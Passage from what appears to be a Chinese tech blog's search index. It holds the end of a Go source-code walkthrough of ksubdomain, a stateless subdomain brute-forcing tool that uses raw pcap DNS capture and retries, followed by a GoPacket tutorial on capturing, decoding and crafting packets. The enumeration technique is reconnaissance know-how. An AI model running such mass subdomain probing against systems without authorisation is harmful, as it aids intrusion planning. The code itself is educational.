class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>gologger.Warningf(<span class="hljs-string">&quot;WritePacketDate error:%s\n&quot;</span>, err.Error())<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下接收操作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *runner)</span></span> recvChanel(ctx context.Context) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">var</span> (<br>snapshotLen = <span class="hljs-number">65536</span><br>timeout     = <span class="hljs-number">-1</span> * time.Second<br>err         <span class="hljs-type">error</span><br>)<br><span class="hljs-comment">// 创建一个 pcap 句柄</span><br>inactive, err := pcap.NewInactiveHandle(r.options.EtherInfo.Device)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>err = inactive.SetSnapLen(snapshotLen)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> inactive.CleanUp()<br><span class="hljs-keyword">if</span> err = inactive.SetTimeout(timeout); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>err = inactive.SetImmediateMode(<span class="hljs-literal">true</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-comment">// 启动开始监听抓包</span><br>handle, err := inactive.Activate()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> handle.Close()<br><span class="hljs-comment">// 设置过滤器</span><br>err = handle.SetBPFFilter(fmt.Sprintf(<span class="hljs-string">&quot;udp and src port 53 and dst port %d&quot;</span>, r.freeport))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> errors.New(fmt.Sprintf(<span class="hljs-string">&quot;SetBPFFilter Faild:%s&quot;</span>, err.Error()))<br>&#125;<br><br><span class="hljs-comment">// Listening</span><br><br><span class="hljs-keyword">var</span> udp layers.UDP<br><span class="hljs-keyword">var</span> dns layers.DNS<br><span class="hljs-keyword">var</span> eth layers.Ethernet<br><span class="hljs-keyword">var</span> ipv4 layers.IPv4<br><span class="hljs-keyword">var</span> ipv6 layers.IPv6<br><span class="hljs-comment">// 解码器</span><br>parser := gopacket.NewDecodingLayerParser(<br>layers.LayerTypeEthernet, &amp;eth, &amp;ipv4, &amp;ipv6, &amp;udp, &amp;dns)<br><br><span class="hljs-keyword">var</span> data []<span class="hljs-type">byte</span><br><span class="hljs-keyword">var</span> decoded []gopacket.LayerType<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br><span class="hljs-keyword">default</span>:<br>data, _, err = handle.ReadPacketData()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>err = parser.DecodeLayers(data, &amp;decoded)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 是否为应答报文</span><br><span class="hljs-keyword">if</span> !dns.QR &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 是否为 Ksubdomain 发送的数据包</span><br><span class="hljs-keyword">if</span> dns.ID != r.dnsid &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// DNS 请求成功计数器 +1</span><br>atomic.AddUint64(&amp;r.recvIndex, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(dns.Questions) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 获取可解析的子域名</span><br>subdomain := <span class="hljs-type">string</span>(dns.Questions[<span class="hljs-number">0</span>].Name)<br><span class="hljs-comment">// 从 Map 中删除, 这里就证明了 DNS 请求成功, 但不能确定是否可解析</span><br>r.hm.Del(subdomain)<br><span class="hljs-comment">// 看是否有答案返回, 有说明是可解析的, 也就是一个存在的域名</span><br><span class="hljs-keyword">if</span> dns.ANCount &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 成功的计数器 +1</span><br>atomic.AddUint64(&amp;r.successIndex, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">var</span> answers []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> dns.Answers &#123;<br><span class="hljs-comment">// 获取答案记录值, A,AAA...</span><br>answer, err := dnsRecord2String(v)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>answers = <span class="hljs-built_in">append</span>(answers, answer)<br>&#125;<br><span class="hljs-comment">// 放入结果通道</span><br>r.recver &lt;- result.Result&#123;<br>Subdomain: subdomain,<br>Answers:   answers,<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里抓下包，这个 ID 就是 “无状态” 模式下，确定是 Ksubdomain 的方法：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/202309162227404.png?imageSlim" alt="image-20230916222710286"></p><p>再看一下重试机制：</p><p>当目标域名发送完成后就开启重试协程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *runner)</span></span> retry(ctx context.Context) &#123;<br>t := time.NewTicker(<span class="hljs-number">1</span> * time.Second)<br><span class="hljs-keyword">defer</span> t.Stop()<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> &lt;-t.C:<br>now := time.Now()<br>r.hm.Scan(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(key <span class="hljs-type">string</span>, v statusdb.Item)</span></span> <span class="hljs-type">error</span> &#123;<br>                <span class="hljs-comment">// 当前重试次数 &gt; 0 且 当前重试次数 &gt; 最大重试次数</span><br><span class="hljs-keyword">if</span> r.maxRetry &gt; <span class="hljs-number">0</span> &amp;&amp; v.Retry &gt; r.maxRetry &#123;<br>r.hm.Del(key)<br>atomic.AddUint64(&amp;r.faildIndex, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>                <span class="hljs-comment">// 数据包发送的时间和当前时间是否超过指定的超时时间</span><br><span class="hljs-keyword">if</span> <span class="hljs-type">int64</span>(now.Sub(v.Time)) &gt;= r.timeout &#123;<br><span class="hljs-comment">// 重新发送</span><br>r.sender &lt;- key<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 Scan 就是去遍历每一个键值对，然后去进行重试方面的测试：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *StatusDb)</span></span> Scan(f <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(key <span class="hljs-type">string</span>, value Item)</span></span> <span class="hljs-type">error</span>) &#123;<br>r.Items.Range(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(key, value <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">bool</span> &#123;<br>k := key.(<span class="hljs-type">string</span>)<br>item := value.(Item)<br>f(k, item)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是 <code>defer cancel()</code>，关闭各种管道啥的</p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/202309162246765.png?imageSlim" alt="image-20230916224651715" style="zoom:67%;" /><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>大概看了一遍代码后学习到了不少东西：</p><ul><li><code>strings.Builder </code> 构建字符串</li><li><code>Printf</code> 中使用 <code>\r</code> 实现类动态更新</li><li><code>//go:embed file</code> 内嵌文件到变量中</li><li><code>sync.Map</code> 的使用</li><li><code>atomic.AddUint64(&amp;r.recvIndex, 1)</code> 并发安全的计数器操作</li><li>多个协程之间使用管道进行数据传递且通过 <code>死循环 + 多路复用 + 上下文 + time.NewTicker</code> 控制协程退出</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://paper.seebug.org/1325/">ksubdomain 无状态域名爆破工具</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang GoPacket 库简单使用</title>
      <link href="/2023/09/15/%E5%BC%80%E5%8F%91/GoPacket/"/>
      <url>/2023/09/15/%E5%BC%80%E5%8F%91/GoPacket/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>GoPacket 是对  libpcap 和 npcap 的 go 封装，其功能就是抓包。</p><p>在分析 ksubdomain 时遇到这个库，简单看一下用法。</p><p>像 wireshark 这种抓包软件其底层使用的就是 npcap，所以说 GoPacket 库的功能也就类似这种。</p><p>项目地址：<a href="https://github.com/google/gopacket">https://github.com/google/gopacket</a></p><p>应用场景：</p><ol><li>网络流量分析</li><li>伪造数据包</li><li>离线 pcap 文件的读取</li></ol><p>在使用 <code>gopacket</code> 包时，首先要确保在 windows 平台下安装了 <code>npcap</code> 或 <code>winpcap</code>，或者是在 linux 平台下安装了 <code>libpcap</code> 库。</p><ul><li><code>npcap</code>：<a href="https://nmap.org/npcap">https://nmap.org/npcap</a></li><li><code>libpcap</code>：<a href="https://www.tcpdump.org/">https://www.tcpdump.org</a></li></ul><p>库安装：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> github.<span class="hljs-keyword">com</span>/google/gopacket<br></code></pre></td></tr></table></figure><h2 id="抓取数据包"><a href="#抓取数据包" class="headerlink" title="抓取数据包"></a>抓取数据包</h2><h3 id="获取网络设备"><a href="#获取网络设备" class="headerlink" title="获取网络设备"></a>获取网络设备</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>devs, err := pcap.FindAllDevs()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">for</span> _, dev := <span class="hljs-keyword">range</span> devs &#123;<br><span class="hljs-keyword">for</span> _, addr := <span class="hljs-keyword">range</span> dev.Addresses &#123;<br>fmt.Println(dev.Name, <span class="hljs-string">&quot;=&gt;&quot;</span>, addr.IP.String())<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>设备信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Interface describes a single network interface on a machine.</span><br><span class="hljs-keyword">type</span> Interface <span class="hljs-keyword">struct</span> &#123;<br>Name        <span class="hljs-type">string</span><br>Description <span class="hljs-type">string</span><br>Flags       <span class="hljs-type">uint32</span><br>Addresses   []InterfaceAddress<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Addresses</code> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> InterfaceAddress <span class="hljs-keyword">struct</span> &#123;<br>IP        net.IP<br>Netmask   net.IPMask <span class="hljs-comment">// Netmask may be nil if we were unable to retrieve it.</span><br>Broadaddr net.IP     <span class="hljs-comment">// Broadcast address for this IP may be nil</span><br>P2P       net.IP     <span class="hljs-comment">// P2P destination address for this IP may be nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="实时抓包"><a href="#实时抓包" class="headerlink" title="实时抓包"></a>实时抓包</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>device             = <span class="hljs-string">&quot;\\Device\\NPF_&#123;657E0D44-808F-42EA-82B5-AFAFF6AE862B&#125;&quot;</span> <span class="hljs-comment">// 设备名称</span><br>snapshot_len <span class="hljs-type">int32</span> = <span class="hljs-number">1024</span>                                                   <span class="hljs-comment">// 读取数据包的最大长度</span><br>promiscuous        = <span class="hljs-literal">false</span>                                                  <span class="hljs-comment">// 混杂模式 ( 接受目的地不是本机的包 )</span><br>timeout            = <span class="hljs-number">-1</span> * time.Second                                       <span class="hljs-comment">// 抓包超时, -1 表示立即刷新数据包</span><br>err          <span class="hljs-type">error</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 打开网络设备</span><br>handle, err := pcap.OpenLive(device, snapshot_len, promiscuous, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> handle.Close()<br>handle.SetBPFFilter(<span class="hljs-string">&quot;dns&quot;</span>)<br><span class="hljs-comment">// 创建数据包源, handle.LinkType() =&gt; 以太网链路</span><br>packetSource := gopacket.NewPacketSource(handle, handle.LinkType())<br><span class="hljs-comment">// 读取数据包</span><br><span class="hljs-keyword">for</span> packet := <span class="hljs-keyword">range</span> packetSource.Packets() &#123;<br>fmt.Println(packet.String())<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>设置过滤器：<code>handle.SetBPFFilter(&quot;dns&quot;)</code></p><p>创建数据包源：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">packetSource := gopacket.NewPacketSource(handle, handle.LinkType())<br></code></pre></td></tr></table></figure><p>读取一次数据包：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">packet, _ := packetSource.NextPacket()<br></code></pre></td></tr></table></figure><p>获得一个读取所有数据包的通道：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> packet := <span class="hljs-keyword">range</span> packetSource.Packets() &#123;<br>    fmt.Println(packet.String())<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="写入读取"><a href="#写入读取" class="headerlink" title="写入读取"></a>写入读取</h3><p>读取 <code>pcap</code> 文件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">handle, _ = pcap.OpenOffline(<span class="hljs-string">&quot;dump.pcap&quot;</span>)<br><span class="hljs-keyword">defer</span> handle.Close()<br></code></pre></td></tr></table></figure><p>写入 <code>pcap</code> 文件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">dumpFile, _ := os.Create(<span class="hljs-string">&quot;dump.pcap&quot;</span>)<br><span class="hljs-keyword">defer</span> dumpFile.Close()<br>packetWriter := pcapgo.NewWriter(dumpFile)<br>packet := packetSource.Packets()<br><span class="hljs-keyword">for</span> packet := <span class="hljs-keyword">range</span> packet&#123;<br>    packetWriter.WritePacket(packet.Metadata().CaptureInfo, packet.Data())<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="数据包解码"><a href="#数据包解码" class="headerlink" title="数据包解码"></a>数据包解码</h2><p>Layers 包是 gopacket 的 Go 库中的新功能，在底层 libpcap 库中不存在。它是 gopacket 库的非常有用的一部分。它允许我们轻松地识别数据包是否包含特定类型的层。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, layer := <span class="hljs-keyword">range</span> packet.Layers() &#123;<br>    fmt.Println(layer.LayerType().String())<span class="hljs-comment">// 当前层的类型 (TCP/DNS/UDP...)</span><br>    fmt.Println(layer.LayerContents())<br>    fmt.Println(layer.LayerPayload())<br>&#125;<br></code></pre></td></tr></table></figure><p>分析某层的数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> packet := <span class="hljs-keyword">range</span> packetSource.Packets() &#123;<br>    <span class="hljs-comment">// 判断数据包是否为 dns 数据包</span><br>    dnsLayer := packet.Layer(layers.LayerTypeDNS)<br>    <span class="hljs-keyword">if</span> dnsLayer != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-comment">// 断言为 DNS 类型</span><br>        dns := dnsLayer.(*layers.DNS)<br>        <span class="hljs-keyword">for</span> _, q := <span class="hljs-keyword">range</span> dns.Questions &#123;<br>            <span class="hljs-comment">// 遍历 Questions 输出 Name</span><br>            fmt.Println(<span class="hljs-type">string</span>(q.Name))<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="创建与发送"><a href="#创建与发送" class="headerlink" title="创建与发送"></a>创建与发送</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>创建一个新的序列化缓冲区；然后把所有层序列化到缓冲区中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">buffer := gopacket.NewSerializeBuffer()<br>options := gopacket.SerializeOptions&#123;&#125;<br>gopacket.SerializeLayers(buffer, options, &amp;layers.Ethernet&#123;&#125;, &amp;layers.IPv4&#123;&#125;, &amp;layers.TCP&#123;&#125;, gopacket.Payload([]<span class="hljs-type">byte</span>&#123;<span class="hljs-number">65</span>, <span class="hljs-number">66</span>, <span class="hljs-number">67</span>&#125;))<br></code></pre></td></tr></table></figure><h3 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">handle.WritePacketData(buffer.Bytes())<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/weixin_49393427/article/details/112362561">gopacket 使用手册 学习笔记 中文文档</a></li><li><a href="https://colobu.com/2019/06/01/packet-capture-injection-and-analysis-gopacket/">[译]利用 gopackage 进行包的捕获、注入和分析</a></li><li><a href="https://zhuanlan.zhihu.com/p/361737169">【酷Go推荐】网络流量抓包库 gopacket</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
